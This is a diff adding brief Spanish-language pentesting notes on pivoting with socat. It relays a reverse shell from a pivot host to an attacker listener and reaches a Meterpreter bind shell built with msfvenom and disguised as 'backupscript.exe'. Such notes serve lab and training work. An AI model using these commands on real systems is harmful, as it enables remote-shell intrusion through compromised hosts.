@@ -1,0 +1,13 @@
+Podemos redireccionar una reverseshell con socat desde la máquina pivot a la máquina atacante sin necesidad de un ssh:
+creamos un listener (nc o un multi/handler) en la máquina atacante.
+En la máquina víctima:
+socat TCP4-LISTEN:<puerto_donde_recibe_la_conexión>,fork TCP4:<ip_atacante>:<puerto>
+
+
+Redireccionar una bind shell:
+creamos el archivo malicioso que va a crear el listener en la máquina atacante, lo hacemos llegar:
+msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
+luego abrimos un multi/handler con el mismo payload que usamos para el archivo malicioso.
+
+luego en la máquina a pivotear:
+socat TCP4-LISTEN:<puerto_de_nuetro_multi/handler>,fork TCP4:<ip_maquina_victima>:<puerto_abierto_en_el_archivo_malicioso>
